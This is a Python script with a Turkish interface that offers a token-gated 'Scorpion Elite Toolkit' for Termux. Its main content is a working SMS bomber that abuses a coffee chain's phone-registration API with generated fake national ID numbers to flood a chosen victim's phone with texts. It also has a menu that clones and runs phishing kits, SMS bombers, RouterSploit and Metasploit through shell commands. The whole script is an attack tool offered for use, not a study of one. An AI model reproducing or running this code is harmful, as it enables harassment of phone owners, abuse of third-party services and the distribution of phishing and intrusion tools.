import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style, Back, init
from time import sleep
from os import system
import threading
import sys

init(autoreset=True)

# ====================== TOKEN SİSTEMİ (GÜNCELLENDİ) ======================
class TokenManager:
    def __init__(self):
        self.token_url = "https://scorpion292439.github.io/scorpion-Toolkit/"
        self.verify_url = "https://ipchecer-default-rtdb.firebaseio.com/tokens.json"
        self.token = None

    def get_token_from_user(self):
        system("clear")
        print(f"""
{Fore.RED}{Style.BRIGHT}
╔{'═' * 80}╗
║{' ' * 28}🔐 TOKEN DOĞRULAMA SİSTEMİ 🔐{' ' * 28}║
╚{'═' * 80}╝{Style.RESET_ALL}
""")
        print(f"{Fore.YELLOW + Style.BRIGHT}⚠️ Token bulunamadı! Resmi siteden al:{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}🌐 Site: {self.token_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW + Style.BRIGHT}🔑 Token: {Fore.GREEN}", end="")
        token = input().strip()

        if self.verify_token(token):
            self.token = token
            print(f"\n{Fore.GREEN + Style.BRIGHT}✅ TOKEN DOĞRULANDI! SCORPION ELITE AKTİF!{Style.RESET_ALL}")
            for i in range(3, 0, -1):
                print(f"{Fore.YELLOW}Başlatılıyor... {i}{Style.RESET_ALL}")
                sleep(1)
            return True
        else:
            print(f"{Fore.RED + Style.BRIGHT}❌ GEÇERSİZ TOKEN! Tekrar dene.{Style.RESET_ALL}")
            sleep(3)
            return False

    def verify_token(self, token):
        try:
            r = requests.get(self.verify_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                for k, v in data.items():
                    if v.get("token") == token:
                        print(f"{Fore.GREEN + Style.BRIGHT}👤 Hoş geldin: {v.get('email', 'Elite User')}{Style.RESET_ALL}")
                        return True
        except: pass
        return False

# ====================== SMS BOMBER (TAM VE GÜNCEL) ======================
class SendSms:
    adet = 0

    def __init__(self, phone, mail):
        print(f"{Fore.RED + Style.BRIGHT}🦂 {Style.RESET_ALL}{Fore.YELLOW + Style.BRIGHT}Scorpion Strike Initialized! Target Locked: {Fore.GREEN + Style.BRIGHT}{phone}{Style.RESET_ALL}")
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
            json={"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, headers=headers, json=json, timeout=6)
            if r.json()["processStatus"] == "Success":
                print(f"{Fore.GREEN + Style.BRIGHT}🦂{Fore.RED + Style.BRIGHT} [STRIKE HIT]{Style.RESET_ALL} {Fore.LIGHTGREEN_EX}Target Down!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")

# ====================== TERMUX TOOL KURULUM FONKSİYONU ======================
def install_tool(tool_name, install_cmd):
    system("clear")
    print(f"""
{Fore.MAGENTA}{Style.BRIGHT}
╔{'═' * 80}╗
║{' ' * 32}{tool_name.upper()}{' ' * 32}║
╚{'═' * 80}╝{Style.RESET_ALL}
""")
    print(f"{Fore.YELLOW + Style.BRIGHT}🚀 {tool_name} kuruluyor...{Style.RESET_ALL}")
    for i in range(1, 101, 10):
        print(f"{Fore.CYAN}Yükleme: [{i} %]{Style.RESET_ALL}")
        sleep(0.2)
    system(install_cmd)
    print(f"{Fore.GREEN + Style.BRIGHT}✅ {tool_name} kuruldu! Başlatmak için 'cd tool_name && bash start.sh' dene.{Style.RESET_ALL}")
    input(f"{Fore.YELLOW}Menüye dönmek için Enter...{Style.RESET_ALL}")

# Tool listesi (siteden alınanlar – FatRat hariç)
TOOLS = {
    "DarkFly Tool V.4.0": "git clone https://github.com/Ranginang67/DarkFly-Tool && cd DarkFly-Tool && python2 install.py",
    "Tool X V.2.1": "git clone https://github.com/rajkumardusad/Tool-X && cd Tool-X && chmod +x install.aex && ./install.aex",
    "Metasploit Framework": "pkg install unstable-repo && pkg install metasploit",
    "Cracker-Tool": "git clone https://github.com/noob-hackers/cracker && cd cracker && python cracker.py",
    "EchoPhish": "git clone https://github.com/EchoPhish/EchoPhish && cd EchoPhish && bash echophish.sh",
    "UserLand": "pkg install wget && wget https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/UserLAnd && bash UserLAnd",
    "VectrasVm": "git clone https://github.com/noob-hackers/vectrasVm && cd vectrasVm && bash install.sh",
    "IP-Tracer": "git clone https://github.com/noob-hackers/ip-tracer && cd ip-tracer && bash ip-tracer.sh",
    "Zphisher": "git clone https://github.com/htr-tech/zphisher && cd zphisher && bash zphisher.sh",
    "SocialFish": "git clone https://github.com/UndeadSec/SocialFish && cd SocialFish && pip install -r requirements.txt && python SocialFish.py",
    "TBomb": "git clone https://github.com/TheSpeedX/TBomb && cd TBomb && pip3 install -r requirements.txt && python tbomb.py",
    "Lazymux": "git clone https://github.com/Gameye98/Lazymux && cd Lazymux && git pull && python lazymux.py",
    "HiddenEye": "git clone https://github.com/DarkSecDevelopers/HiddenEye-Legacy && cd HiddenEye-Legacy && python HiddenEye.py",
    "PhoneInfoga": "git clone https://github.com/sundowndev/PhoneInfoga && cd PhoneInfoga && python phoneinfoga.py -h",
    "Sherlock": "git clone https://github.com/sherlock-project/sherlock && cd sherlock && python sherlock.py",
    "RouterSploit": "git clone https://github.com/threat9/routersploit && cd routersploit && pip3 install -r requirements.txt && python3 rsf.py",
    "SMS Bomber Turk": "git clone https://github.com/noob-hackers/smsbomber && cd smsbomber && python smsbomber.py"
}

# ====================== ANA BANNER (HAVALI) ======================
def print_main_banner():
    system("clear")
    print(f"""
{Fore.RED + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🦂 SCORPION ELITE TOOLKIT 🦂{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
{Fore.YELLOW + Style.BRIGHT}v3.0 | Powered by Scorpion | Termux & Windows Elite Edition{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}🔥 Token Aktif • 17+ Premium Tool • Turbo Mods • Auto Install{Style.RESET_ALL}
""")

# ====================== SMS BOMBER MENÜSÜ (HAVALI) ======================
def sms_bomber_menu(token_manager):
    while True:
        system("clear")
        print(f"""
{Fore.RED + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🦂 SMS BOMBER MENÜSÜ 🦂{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
""")
        print(f"{Fore.YELLOW + Style.BRIGHT}Hedef Telefon: {Fore.GREEN}+90XXXXXXXXXX{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}1. {Fore.GREEN}Normal Mod (Tek Servis){Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}2. {Fore.RED}Turbo Mod (Tüm Servisler){Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}3. {Fore.YELLOW}Geri Dön{Style.RESET_ALL}")
        
        try:
            secim = input(f"\n{Fore.YELLOW + Style.BRIGHT}Seçim → {Fore.GREEN}")
            if secim == "1":
                phone = input(f"{Fore.YELLOW}Hedef Telefon (+90): {Fore.GREEN}")
                if not phone.startswith("+90"):
                    phone = "+90" + phone
                sms = SendSms(phone, "")
                sms.KahveDunyasi()
                input(f"{Fore.YELLOW}Devam etmek için Enter...{Style.RESET_ALL}")
            elif secim == "2":
                phone = input(f"{Fore.YELLOW}Hedef Telefon (+90): {Fore.GREEN}")
                if not phone.startswith("+90"):
                    phone = "+90" + phone
                sms = SendSms(phone, "")
                # Burada diğer servisler eklenebilir
                sms.KahveDunyasi()
                input(f"{Fore.YELLOW}Devam etmek için Enter...{Style.RESET_ALL}")
            elif secim == "3":
                break
            else:
                print(f"{Fore.RED}❌ Geçersiz seçim!{Style.RESET_ALL}")
                sleep(2)
        except Exception as e:
            print(f"{Fore.RED}Hata: {e}{Style.RESET_ALL}")
            sleep(2)

# ====================== TOOL MENÜSÜ (YENİ – SİTEDEN ALINANLAR) ======================
def tools_menu():
    while True:
        system("clear")
        print(f"""
{Fore.MAGENTA + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🔧 TERMUX TOOL KURULUM MENÜSÜ 🔧{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
""")
        for i, (name, _) in enumerate(TOOLS.items(), 1):
            print(f"{Fore.CYAN + Style.BRIGHT}{i:2d}. {Fore.WHITE + Style.BRIGHT}{name}{Style.RESET_ALL}")
        print(f"{Fore.CYAN + Style.BRIGHT}99. {Fore.RED}Geri Dön{Style.RESET_ALL}")
        try:
            sec = int(input(f"\n{Fore.YELLOW + Style.BRIGHT}Seçim → {Fore.GREEN}"))
            if sec == 99: 
                break
            if 1 <= sec <= len(TOOLS):
                tool_name = list(TOOLS.keys())[sec-1]
                cmd = TOOLS[tool_name]
                install_tool(tool_name, cmd)
        except: 
            print(f"{Fore.RED}Hatalı giriş!{Style.RESET_ALL}")
            sleep(2)

# ====================== DARKFLY KURULUM (HAVALI) ======================
def darkfly_installer():
    system("clear")
    print(f"""
{Fore.RED + Style.BRIGHT}
╔{'═' * 80}╗
║{' ' * 32}🦋 DARKFLY TOOL V4.0 KURULUM 🦋{' ' * 32}║
╚{'═' * 80}╝{Style.RESET_ALL}
""")
    print(f"{Fore.YELLOW + Style.BRIGHT}🚀 DarkFly kuruluyor...{Style.RESET_ALL}")
    cmds = [
        "pkg install python2 -y",
        "pkg install git -y",
        "git clone https://github.com/Ranginang67/DarkFly-Tool",
        "cd DarkFly-Tool && python2 install.py"
    ]
    for cmd in cmds:
        print(f"{Fore.CYAN}[RUN] {cmd}{Style.RESET_ALL}")
        system(cmd)
        sleep(1)
    system("clear")
    print(f"""
{Fore.MAGENTA + Style.BRIGHT}
    ██████╗  █████╗ ██████╗ ██╗  ██╗██████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔══██╗╚██╗ ██╔╝
    ██║  ██║███████║██████╔╝█████╔╝ ██████╔╝ ╚████╔╝ 
    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ██╔══██╗  ╚██╔╝  
    ██████╔╝██║  ██║██║  ██║██║  ██╗██║  ██║   ██║   
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
{Style.RESET_ALL}
{Fore.GREEN + Style.BRIGHT}                    KURULUM TAMAM!{Style.RESET_ALL}
""")
    sleep(3)
    print(f"{Fore.CYAN}DarkFly başlatılıyor...{Style.RESET_ALL}")
    system("cd DarkFly-Tool && python2 DarkFly.py")
    input(f"{Fore.YELLOW}Menüye dön...{Style.RESET_ALL}")

# ====================== ANA MENÜ (GENİŞLETİLMİŞ & HAVALI) ======================
def main():
    token_manager = TokenManager()
    while token_manager.token is None:
        if not token_manager.get_token_from_user():
            continue
        break

    while True:
        print_main_banner()
        print(f"""
{Fore.MAGENTA + Style.BRIGHT}
╔{'═' * 90}╗
║{' ' * 40}🚀 ANA MENÜ - ELITE TOOLS 🚀{' ' * 40}║
╚{'═' * 90}╝{Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}1. {Fore.GREEN}🦂 SMS Bomber (Turbo & Normal){Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}2. {Fore.MAGENTA}🦋 DarkFly Tool Kur & Başlat{Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}3. {Fore.YELLOW}🔧 Termux Tool Kurulum Menüsü (17+ Tool){Style.RESET_ALL}
{Fore.CYAN + Style.BRIGHT}4. {Fore.RED}❌ Çıkış / Exit{Style.RESET_ALL}
""")
        try:
            secim = input(f"\n{Fore.YELLOW + Style.BRIGHT}Seçim → {Fore.GREEN}")
            if secim == "1": 
                sms_bomber_menu(token_manager)
            elif secim == "2": 
                darkfly_installer()
            elif secim == "3": 
                tools_menu()
            elif secim == "4":
                print(f"{Fore.RED + Style.BRIGHT}👋 Scorpion kapanıyor... Elite kal!{Style.RESET_ALL}")
                for i in range(3, 0, -1): 
                    print(f"{Fore.YELLOW}Çıkış: {i}{Style.RESET_ALL}")
                    sleep(1)
                sys.exit(0)
            else: 
                print(f"{Fore.RED}❌ Geçersiz!{Style.RESET_ALL}")
                sleep(2)
        except: 
            print(f"{Fore.RED}Hata!{Style.RESET_ALL}")
            sleep(2)

if __name__ == "__main__":
    main()
